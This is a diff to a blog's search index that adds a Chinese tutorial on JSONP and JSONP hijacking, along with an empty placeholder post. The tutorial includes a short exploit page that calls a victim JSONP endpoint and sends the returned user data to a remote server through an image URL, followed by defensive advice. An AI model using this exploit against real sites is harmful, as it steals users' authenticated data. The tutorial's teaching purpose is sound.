@@ -1,6 +1,33 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>jsonp 以及jsonp劫持</title>
+    <url>/2020/06/16/jsonp/</url>
+    <content><![CDATA[<h2 id="Part-1-什么是jsonp"><a href="#Part-1-什么是jsonp" class="headerlink" title="Part 1 什么是jsonp"></a>Part 1 什么是jsonp</h2><h3 id="产生背景——同源策略"><a href="#产生背景——同源策略" class="headerlink" title="产生背景——同源策略"></a>产生背景——同源策略</h3><p><code>同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。 是否同源由URL决定，URL由协议、域名、端口和路径组成，如果两个URL的协议、域名和端口相同，则表示他们同源。</code></p>
+<h3 id="jsonp原理"><a href="#jsonp原理" class="headerlink" title="jsonp原理"></a>jsonp原理</h3><p><code>JSONP</code> 全称是 <code>JSON with Padding</code>，是基于 <code>JSON</code>格式的为解决跨域请求资源而产生的解决方案。<code>JSONP</code>就是利用 <code>&lt;script&gt;</code>标签的跨域能力实现跨域数据的访问，请求动态生成的<code>JavaScript</code>脚本同时带一个<code>callback</code>函数名作为参数。<br>服务端收到请求后，动态生成脚本产生数据，并在代码中以产生的数据为参数调用<code>callback</code>函数。</p>
+<p>一个简单的服务端<br><img src="/2020/06/16/jsonp/01.png" alt></p>
+<p>调用者只需要定义一个用于处理数据的<code>test</code>函数,同时通过<code>script</code>标签引入提供<code>jsonp</code>的 <code>url</code>即可。</p>
+<p>注：</p>
+<p>1.拥有<code>src</code>这个属性的标签都拥有跨域的能力，比如<code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;iframe&gt;</code></p>
+<p>2.若传递回来的内容只包含<code>json</code>，由于<code>script</code>标签加载完之后，会立即将响应中的内容当做<code>js</code>执行，会报语法错误。</p>
+<h2 id="Part-2-jsonp劫持"><a href="#Part-2-jsonp劫持" class="headerlink" title="Part 2 jsonp劫持"></a>Part 2 jsonp劫持</h2><h3 id="jsonp劫持简介"><a href="#jsonp劫持简介" class="headerlink" title="jsonp劫持简介"></a>jsonp劫持简介</h3><p>当某网站通过 <code>JSONP</code>的方式来快域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 <code>JSONP</code>调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。</p>
+<h3 id="jsonp劫持测试"><a href="#jsonp劫持测试" class="headerlink" title="jsonp劫持测试"></a>jsonp劫持测试</h3><p>若我们发现了如下（其实就是上面的图，直接用的<code>dorabox</code>）的<code>jsonp</code>接口，并且未对请求来源进行验证，即可；利用进行劫持。<br><img src="/2020/06/16/jsonp/01.png" alt></p>
+<p>简单的<code>exp</code>,诱导受害者访问后将数据发送至远程服务器<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">"?"</span> id=<span class="string">"img"</span>&gt;</span><br><span class="line">&lt;script&gt;<span class="function"><span class="keyword">function</span> <span class="title">vulkey</span>(<span class="params">data</span>)</span>&#123;alert(<span class="built_in">JSON</span>.stringify(data));</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'img'</span>).src=<span class="string">"http://127.0.0.1:8000/?data="</span>+(<span class="built_in">JSON</span>.stringify(data)).toString()</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script src="http:/</span><span class="regexp">/127.0.0.1/</span>csrf/jsonp.php?callback=vulkey<span class="string">"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/06/16/jsonp/02.png" alt></p>
+<h3 id="jsonp劫持的防御"><a href="#jsonp劫持的防御" class="headerlink" title="jsonp劫持的防御"></a>jsonp劫持的防御</h3><p>1.<code>jsonp</code>劫持属于<code>csrf</code>,应该对调用来源做验证，一般有通过验证<code>Referer</code>或者<code>token</code>来防御，但<code>Referer</code>要注意过滤不严的问题，<code>token</code>需要注意是否容易被爆破的问题。</p>
+]]></content>
+      <tags>
+        <tag>jsonp</tag>
+        <tag>csrf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ssti</title>
+    <url>/2020/06/12/ssti/</url>
+    <content><![CDATA[<p>咕咕咕</p>
+]]></content>
+  </entry>
+  <entry>
     <title>sics-07 wp</title>
     <url>/2020/06/04/sics-07/</url>
     <content><![CDATA[<h1 id><a href="#" class="headerlink" title=" "></a> </h1><p>找到一个可以点开的地方<br><img src="/2020/06/04/sics-07/01.png" alt="timu"></p>
